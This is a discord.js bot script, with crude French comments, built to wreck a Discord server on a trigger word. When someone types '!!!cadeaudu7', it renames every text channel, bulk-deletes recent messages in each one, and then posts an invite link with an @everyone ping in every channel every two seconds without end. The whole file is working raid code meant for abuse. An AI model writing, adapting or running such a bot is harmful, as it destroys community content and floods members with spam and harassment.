// LE SPAM DE SEVEN TURBO DEBANDADE SA MERE AVEC LE PING DE C MORT LE DISCORD J'VAIS LE CHIBREE
const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const ACTIVATION_WORD = '!!!cadeaudu7';
const NEW_NAME = 'GO-GLASTRP';
const SPAM_LINK = {
  content: 'GO TOUT LE MONDE <@everyone> https://discord.gg/glastv1',
  allowedMentions: { parse: ['everyone'] }  // PING @everyone ACTIVÉ
};

client.on('ready', () => {
  console.log("Connectée en temps que : " + client.user.tag);
});

client.on('messageCreate', async (message) => {
  if (message.content === ACTIVATION_WORD) {
    console.log("ACTIVATION DU MODE SPAM CA MERE !");
    await message.channel.send('OKAAYYY LESSGOOO 🚀💥');

    const guild = message.guild;
    if (!guild) return;

    // Récupère TOUS les channels texte
    const textChannels = guild.channels.cache.filter(ch => ch.isTextBased());
    console.log(`🎯 ${textChannels.size} channels texte trouvés`);

    // TRAITEMENT ULTRA-RAPIDE (PARALLÈLE)
    await Promise.all(
      Array.from(textChannels.values()).map(async (channel) => {
        try {
          console.log(`⚙️ Traitement #${channel.name}`);
          
          // 1. RENOOMMER instantané
          await channel.setName(NEW_NAME);
          
          // 2. PURGE RAPIDE (150+ messages)
          await fastPurge(channel);
          
        } catch (err) {
          console.error(`❌ #${channel.name}:`, err.message);
        }
      })
    );

    console.log("✅ PURGE TERMINÉE - SPAM ACTIVÉ !");

    // SPAM INFINI TOUS LES 2s avec @everyone
    setInterval(() => {
      textChannels.forEach(ch => {
        ch.send(SPAM_LINK).catch(() => {});
      });
    }, 2000);
  }
});

// FONCTION PURGE ULTRA-RAPIDE
async function fastPurge(channel) {
  try {
    // 3 lots de 50 = 150 messages
    await channel.bulkDelete(50, true);
    await channel.bulkDelete(50, true);
    const remaining = await channel.messages.fetch({ limit: 50 });
    if (remaining.size > 1) {
      await channel.bulkDelete(remaining, true);
    }
    console.log(`🗑️ #${channel.name} PURGÉ (${remaining.size + 100} msg)`);
  } catch (err) {
    // Ignore rate limits
  }
}

client.login(process.env.DISCORD_TOKEN);
